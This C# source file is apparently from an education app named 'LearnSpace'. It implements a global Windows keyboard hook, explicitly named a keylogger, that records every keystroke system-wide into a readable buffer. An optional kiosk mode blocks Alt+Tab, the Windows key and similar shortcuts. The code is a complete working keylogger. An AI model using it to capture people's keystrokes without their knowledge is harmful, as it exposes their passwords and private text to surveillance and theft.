using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Input;

namespace LearnSpace.Core.Win32
{
    public class KeyloggerService : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        // Buffer để lưu trữ văn bản gõ phím sao cho "dễ đọc"
        private StringBuilder _logBuffer = new StringBuilder();

        public KeyloggerService()
        {
            _proc = HookCallback;
        }

        public void Start()
        {
            _hookID = SetHook(_proc);
        }

        public void Stop()
        {
            UnhookWindowsHookEx(_hookID);
        }

        /// <summary>
        /// Lấy toàn bộ log phím hiện tại và xóa buffer
        /// </summary>
        public string FlushLog()
        {
            lock (_logBuffer)
            {
                string result = _logBuffer.ToString();
                _logBuffer.Clear();
                return result;
            }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public bool IsKioskMode { get; set; } = false;

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Key key = KeyInterop.KeyFromVirtualKey(vkCode);

                // Chặn phím hệ thống khi đang ở chế độ Kiosk
                if (IsKioskMode)
                {
                    bool isAlt = (Keyboard.Modifiers & ModifierKeys.Alt) != 0;
                    bool isCtrl = (Keyboard.Modifiers & ModifierKeys.Control) != 0;

                    // Chặn Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key, Alt+F4
                    if ((isAlt && key == Key.Tab) || 
                        (isAlt && key == Key.Escape) || 
                        (isCtrl && key == Key.Escape) ||
                        (isAlt && key == Key.F4) ||
                        key == Key.LWin || key == Key.RWin)
                    {
                        return (IntPtr)1; // Chặn phím không cho truyền tiếp
                    }
                }

                lock (_logBuffer)
                {
                    if (key == Key.Back) { _logBuffer.Append("[BACKSPACE]"); }
                    else if (key == Key.Enter) { _logBuffer.Append("[ENTER]\r\n"); }
                    else if (key == Key.Space) { _logBuffer.Append(" "); }
                    else if (key == Key.Tab) { _logBuffer.Append("[TAB]"); }
                    else if (key == Key.Escape) { _logBuffer.Append("[ESC]"); }
                    else if (key == Key.None || key == Key.Capital || key == Key.LWin || key == Key.RWin || key == Key.System || key == Key.ImeProcessed) { }
                    else if (key >= Key.LeftShift && key <= Key.RightAlt) { /* Bỏ qua Shift/Ctrl/Alt/Win */ }
                    else
                    {
                        string keyStr = key.ToString();
                        
                        // Xử lý A-Z
                        if (key >= Key.A && key <= Key.Z)
                        {
                            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
                            bool caps = (GetKeyState(0x14) & 0x0001) != 0;
                            bool isUpper = (shift && !caps) || (!shift && caps);
                            string letter = keyStr;
                            if (!isUpper) letter = letter.ToLower();
                            _logBuffer.Append(letter);
                        }
                        // Xử lý 0-9
                        else if (key >= Key.D0 && key <= Key.D9)
                        {
                            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
                            string num = keyStr.Replace("D", "");
                            if (shift)
                            {
                                string[] symbols = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                                _logBuffer.Append(symbols[int.Parse(num)]);
                            }
                            else
                            {
                                _logBuffer.Append(num);
                            }
                        }
                        // Xử lý Numpad
                        else if (key >= Key.NumPad0 && key <= Key.NumPad9)
                        {
                            _logBuffer.Append(keyStr.Replace("NumPad", ""));
                        }
                        // Xử lý các dấu câu
                        else if (key == Key.OemPeriod || key == Key.Decimal) _logBuffer.Append(".");
                        else if (key == Key.OemComma) _logBuffer.Append(",");
                        else if (key == Key.OemQuestion) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "?" : "/");
                        else if (key == Key.OemQuotes) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "\"" : "'");
                        else if (key == Key.OemSemicolon) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? ":" : ";");
                        else if (key == Key.OemOpenBrackets) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "{" : "[");
                        else if (key == Key.OemCloseBrackets) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "}" : "]");
                        else if (key == Key.OemPipe) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "|" : "\\");
                        else if (key == Key.OemPlus) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "+" : "=");
                        else if (key == Key.OemMinus) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "_" : "-");
                        else if (key == Key.OemTilde) _logBuffer.Append((GetKeyState(0x10) & 0x8000) != 0 ? "~" : "`");
                        else
                        {
                            if (!keyStr.Contains("Shift") && !keyStr.Contains("Ctrl") && !keyStr.Contains("Alt") && !keyStr.Contains("System"))
                            {
                                _logBuffer.Append($"[{keyStr}]");
                            }
                        }
                    }
                }
            }
            
            // Tiếp tục chuỗi hook để không làm kẹt bàn phím của người dùng
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public void Dispose()
        {
            Stop();
        }

        // --- WIN32 API IMPORTS ---
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
        
        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);
        
        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);
    }
}
